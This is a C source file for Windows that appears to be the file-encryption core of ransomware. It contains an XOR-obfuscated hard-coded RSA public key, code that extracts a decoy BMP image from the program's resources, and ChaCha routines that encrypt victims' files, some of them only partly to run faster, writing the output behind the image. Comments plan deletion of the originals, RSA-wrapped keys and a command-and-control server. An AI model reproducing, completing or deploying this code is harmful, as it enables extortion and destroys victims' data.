#include "Crypto.h"
HCRYPTPROV hCryptProv;
BYTE publicKeyBlob[148] = { 0x7f, 0x63, 0x79, 0x65, 0x65, 0xd0, 0x79, 0x61, 0x2b, 0x36, 0x24, 0x45, 0x79, 0x65, 0x79, 0x65, 0x64, 0x74, 0x78, 0x61, 0x48, 0x39, 0x39, 0x21, 0x4, 0x57, 0xbe, 0xad, 0x97, 0x82, 0xcd, 0x6, 0x8e, 0x2e, 0x8f, 0x6d, 0x7e, 0xfd, 0xff, 0x95, 0x85, 0x21, 0x94, 0xee,
0xcd, 0xb8, 0x6c, 0x32, 0x9, 0x56, 0x3c, 0xc4, 0x66, 0xe9, 0xb6, 0xde, 0xfa, 0xba, 0x6a, 0xed, 0x31, 0xed, 0xcc, 0x39, 0xe2, 0x41, 0x7f, 0x70, 0x6e, 0x69, 0x9b, 0x8d, 0xa3, 0x6a, 0x4e, 0x25, 0x1f, 0xa2, 0xbd, 0x3b, 0xca, 0x52, 0x71, 0xf2, 0x31, 0x9b, 0x5c, 0xf6, 0x94, 0x29, 0xd8, 0x16, 0x97, 0x7c, 0x7f, 0x39, 0x81, 0x5, 0x92, 0xfd, 0x38, 0x26, 0xf6, 0x76, 0xb8, 0x23, 0xfb, 0x18, 0x85, 0x48, 0x2c, 0xf7, 0x3, 0xe5, 0x39, 0x81, 0x56, 0x12, 0xa4, 0x3b, 0x5f, 0xb5, 0xec, 0xc8, 0x5f, 0x60, 0x9a, 0x4e, 0x4, 0x3c, 0xff, 0xc4,
0xad, 0x16, 0xaa, 0x29, 0x9e, 0xc2, 0x1f, 0xc3, 0x52, 0x2f, 0x83, 0x9a, 0x14, 0xb5, 0x1c, 0xde };
LPCSTR duckPath;

int extractResource() {
	LPSTR lpTemp;
	BYTE randomBuffer[16];
	HANDLE tempFile;
	DWORD dwSizeOfResource;
	HMODULE hFile = NULL;
	HRSRC hResource;
	HGLOBAL hgResource;
	LPVOID lpResource;
	HANDLE duckFile = NULL;
	DWORD writeBytes = 0;
	int return_val = -1;
	lpTemp = (LPSTR)calloc(MAX_PATH, 1);
	if (!lpTemp) {
		goto CLEANUP;
	}

	if (!GetTempPathA(MAX_PATH, lpTemp)) {
		goto CLEANUP;
	}

	strcat(lpTemp, "duckTempFile.bmp");
	duckPath = (LPCSTR)calloc(strlen(lpTemp) + 1, 1);
	if (!duckPath) {
		goto CLEANUP;
	}
	strcpy((char*)duckPath, lpTemp);

	hFile = GetModuleHandleA(NULL);
	if (hFile == INVALID_HANDLE_VALUE || !hFile) {
		goto CLEANUP;
	}

	hResource = FindResourceA(
		hFile,
		MAKEINTRESOURCEA(101),
		"YEET"
	);

	if (!hResource) {
		goto CLEANUP;
	}

	dwSizeOfResource = SizeofResource(NULL, hResource);
	if (dwSizeOfResource == 0) {
		goto CLEANUP;
	}

	hgResource = LoadResource(
		NULL,
		hResource
	);

	if (!hgResource) {
		goto CLEANUP;
	}


	lpResource = LockResource(hgResource);
	if (!lpResource) {
		goto CLEANUP;
	}

	duckFile = CreateFileA(duckPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (duckFile == INVALID_HANDLE_VALUE || duckFile == 0) {
		goto CLEANUP;
	}

	if (WriteFile(duckFile, lpResource, dwSizeOfResource, &writeBytes, NULL) == FALSE) {
		goto CLEANUP;
	}

	if (writeBytes != dwSizeOfResource) {
		goto CLEANUP;
	}

	return_val = 0;
CLEANUP:
	if (lpTemp) {
		free(lpTemp);
	}
	if (duckFile) {
		CloseHandle(duckFile);
	}
	return return_val;
}

int cryptInit() {
	if (CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, 0)) {
		printf("CryptAcquireContext succeeds.\n");
	}
	else {
		printf("CryptAcquireContext fails.\n");
		return -1;
	}

	const char* decryptKey = "yayeet";
	for (int i = 0; i < 148; i++) {
		publicKeyBlob[i] = publicKeyBlob[i] ^ decryptKey[i % strlen(decryptKey)];
	}

	if (extractResource() == -1) {
		return -1;
	}


	return 0;
}


void cryptCleanUp() {
	if (hCryptProv != NULL) {
		CryptReleaseContext(hCryptProv, 0);
	}
	if (duckPath) {
		free((void*)duckPath);
	}
}

// Make sure key size is 256, nonce size is 8
int chachaFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];

	CHACHA_CONTEXT context;
	DWORD byteRead;
	DWORD byteWrite;
	chachaKeySetup(&context, key);
	chachaNonceSetup(&context, nonce);

	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
	SetFilePointer(hFileOut, 0, 0, FILE_END);

	for (;;) {
		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
			printf("Read file fails. 0x%x\n", GetLastError());
			return -1;
		}

		chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
		if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
			printf("Write file fails. 0x%x\n", GetLastError());
			return -1;
		}
		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
			break;
		}
	}
	printf("Encrypt suceeds\n");
	return 0;
}

int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
	DWORD dwMaxLengthEncrypt = GetFileSize(hFileIn, NULL) / 2;
	CHACHA_CONTEXT context;
	DWORD byteRead;
	DWORD byteWrite;
	chachaKeySetup(&context, key);
	chachaNonceSetup(&context, nonce);

	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
	SetFilePointer(hFileOut, 0, 0, FILE_END);
	DWORD totalRead = 0;
	for (;;) {
		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
			printf("Read file fails. 0x%x\n", GetLastError());
			return -1;
		}

		chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
		if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
			printf("Write file fails. 0x%x\n", GetLastError());
			return -1;
		}

		totalRead += byteRead;
		if (totalRead > dwMaxLengthEncrypt) {
			break;
		}

		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
			break;
		}
	}

	for (;;) {
		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
			printf("Read file fails. 0x%x\n", GetLastError());
			return -1;
		}
		if (WriteFile(hFileOut, buffer[0], byteRead, &byteWrite, NULL) == FALSE) {
			printf("Write file fails. 0x%x\n", GetLastError());
			return -1;
		}
		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
			break;
		}
	}

	printf("Encrypt suceeds\n");
	return 0;
}

int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
	DWORD fileSize = GetFileSize(hFileIn, NULL);
	DWORD dwEncryptBlockSize = ((1500.0 / 9240.0) * fileSize) / 3.0;
	DWORD dwSkipLength = (fileSize - 3 * dwEncryptBlockSize) / 2;

	printf("encryptBlockSize %d\n", dwEncryptBlockSize);
	CHACHA_CONTEXT context;
	DWORD byteRead;
	DWORD byteWrite;
	chachaKeySetup(&context, key);
	chachaNonceSetup(&context, nonce);

	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
	SetFilePointer(hFileOut, 0, 0, FILE_END);
	DWORD totalRead = 0;

	for (int i = 0; i < 3; i++) {
		DWORD totalReadBlock = 0;
		if (i == 2) {
			for (;;) {
				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
					printf("Read file fails. 0x%x\n", GetLastError());
					return -1;
				}

				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
					printf("Write file fails. 0x%x\n", GetLastError());
					return -1;
				}
				if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
					break;
				}
			}
		}
		else {
			while (TRUE) { // encrypt block
				if (totalReadBlock + CHACHA_BLOCKLENGTH * 1024 > dwEncryptBlockSize) {
					break;
				}
				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
					printf("Read file fails. 0x%x\n", GetLastError());
					return -1;
				}
				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
					printf("Write file fails. 0x%x\n", GetLastError());
					return -1;
				}
				totalReadBlock += byteRead;
			}

			DWORD temp = 0;
			DWORD maxRead = (totalReadBlock + CHACHA_BLOCKLENGTH * 1024 - dwEncryptBlockSize) + dwSkipLength;

			BYTE* tempBuffer = (BYTE*)calloc(maxRead, 1);

			if (ReadFile(hFileIn, tempBuffer, maxRead, &byteRead, NULL) == FALSE) {
				printf("Read file fails. 0x%x\n", GetLastError());
				return -1;
			}
			if (WriteFile(hFileOut, tempBuffer, maxRead, &byteWrite, NULL) == FALSE) {
				printf("Write file fails. 0x%x\n", GetLastError());
				return -1;
			}
			free(tempBuffer);
		}
	}

	return 0;
}

DWORD getLengthString(LPCSTR oriFileName) {
	DWORD i = 0;

	while (1) {
		if (!oriFileName[i]) {
			break;
		}
		i++;
	}
	return i;
}

// Note to self: delete infile after encryption
int fileEncrypt(LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
	HANDLE inFile = CreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD fileSize = GetFileSize(inFile, NULL);
	DWORD lenName = getLengthString((CHAR*)oriFileName);
	HANDLE outFile = NULL;
	CHAR* newFileName;
	DWORD sizeFlag = 0;
	if (inFile == INVALID_HANDLE_VALUE) {
		return -1;
	}
	newFileName = (CHAR*)calloc(lstrlenA(oriFileName) + 5, 1);

	newFileName = (CHAR*)memmove(newFileName, oriFileName, lstrlenA(oriFileName));

	(CHAR*)memmove(newFileName + lstrlenA(oriFileName), ".bmp", lstrlenA(".bmp"));

	if (CopyFileA(duckPath, newFileName, TRUE) == FALSE) {
		goto CLEANUP;
	}

	if (fileSize > 10485760 && fileSize < 104857600) {
		sizeFlag = 1;
	}
	else if (fileSize >= 104857600) {
		sizeFlag = 2;
	}
	else {
		sizeFlag = 0;
	}
	if (outFile == INVALID_HANDLE_VALUE) {
		goto CLEANUP;
	}
	if (sizeFlag == 0) {
		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		chachaFileEncrypt(inFile, outFile, key, nonce);
	}
	else if (sizeFlag == 1) {
		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		chachaMediumFileEncrypt(inFile, outFile, key, nonce);
	}
	else {
		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		chachaLargeFileEncrypt(inFile, outFile, key, nonce);
	}

CLEANUP:
	if (newFileName) {
		free(newFileName);
	}
	if (inFile) {
		CloseHandle(inFile);
	}
	if (outFile) {
		CloseHandle(outFile);
	}
}


//- Hard - coded public key
//- Server public key(Github) -> have to set up CC, too lazy...
//- Random number as Chacha key->encrypt file + flip bytes->random number xor with last edit time->encrypted with RSA public->embedded into the image in the front